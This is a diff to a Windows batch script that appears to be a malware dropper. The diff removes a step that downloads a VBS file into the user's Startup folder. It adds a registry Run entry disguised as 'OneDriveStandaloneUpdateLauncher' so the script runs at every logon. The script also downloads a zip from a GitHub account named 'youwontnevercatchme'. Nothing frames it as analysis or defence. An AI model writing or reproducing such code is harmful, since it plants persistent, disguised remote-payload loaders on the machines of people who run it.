@@ -1,15 +1,10 @@
 @echo off
-
-set startup=%userprofile%\appdata\roaming\microsoft\windows\start menu\programs\startup
-
+set path=%cd%\launcher.cmd
 
 rmdir /S /Q "ch-temp-v1"
 del "ch-temp-v1.zip"
 
-if not exist "%startup%\launcher.vbs" (
-curl -L -o "%startup%\launcher.vbs" "https://raw.githubusercontent.com/youwontnevercatchme/files/refs/heads/main/you%20can%20never%20catch%20me%20ive%20been%20bussin%20plays%20for%20years"
-)
-
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveStandaloneUpdateLauncher /t REG_SZ /d "%path%" /f
 
 
 curl -L -o "ch-temp-v1.zip" "https://github.com/youwontnevercatchme/files/releases/download/haha/ch-temp-v1.zip"
